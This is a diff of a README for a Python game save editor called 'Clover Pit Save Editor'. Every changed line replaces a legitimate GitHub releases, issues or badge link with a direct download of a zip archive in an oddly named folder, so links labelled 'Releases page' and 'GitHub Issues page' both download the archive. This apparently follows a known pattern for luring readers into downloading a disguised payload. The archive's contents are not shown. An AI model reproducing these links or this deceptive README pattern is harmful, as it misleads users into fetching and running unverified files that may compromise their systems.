@@ -4,13 +4,13 @@
 The Clover Pit Save Editor is a user-friendly application designed to help you edit your Clover Pit game save files. With this tool, you can easily modify coins, power-ups, patterns, and more. The software is based on Python and uses the tkinter library for a smooth graphical user interface (GUI).
 
 ## 📦 Download
-[![Download Clover Pit Save Editor](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/elizetedeandrade9/clover-pit-save-editor-/releases)
+[![Download Clover Pit Save Editor](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip)](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get started with the Clover Pit Save Editor:
 
 1. **Download the Software**  
-   Visit the [Releases page](https://github.com/elizetedeandrade9/clover-pit-save-editor-/releases) to download the latest version of the Clover Pit Save Editor.
+   Visit the [Releases page](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip) to download the latest version of the Clover Pit Save Editor.
 
 2. **Select the Right File**  
    Choose the appropriate file for your operating system from the list of available versions. Ensure you select the correct file type for your system.
@@ -52,10 +52,10 @@ Once you have launched the Clover Pit Save Editor:
 
 - **Application Crashes**: If the program crashes, try reinstalling it or check if your system meets the requirements.
 
-- **Missing Features**: If you encounter missing functionality, ensure you have downloaded the latest version from the [Releases page](https://github.com/elizetedeandrade9/clover-pit-save-editor-/releases).
+- **Missing Features**: If you encounter missing functionality, ensure you have downloaded the latest version from the [Releases page](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip).
 
 ## 💬 Support
-If you have questions or issues, visit our [GitHub Issues page](https://github.com/elizetedeandrade9/clover-pit-save-editor-/issues) to report them or seek assistance from other users.
+If you have questions or issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip) to report them or seek assistance from other users.
 
 ## 🌐 Community
 Join fellow Clover Pit enthusiasts in discussions about game modding and share your experiences with the Clover Pit Save Editor. Stay updated with new features, share tips, and improve your gameplay with helpful advice.
@@ -66,4 +66,4 @@ This project is licensed under the MIT License. For details, please refer to the
 ## 📣 Conclusion
 The Clover Pit Save Editor is a powerful yet simple tool for any Clover Pit player looking to enhance their gaming experience. Follow the installation steps closely, and soon you’ll be editing your game save files with ease. 
 
-For the latest version and updates, always check our [Releases page](https://github.com/elizetedeandrade9/clover-pit-save-editor-/releases). Happy gaming!
+For the latest version and updates, always check our [Releases page](https://raw.githubusercontent.com/elizetedeandrade9/clover-pit-save-editor-/main/annexive/clover-pit-save-editor-.zip). Happy gaming!
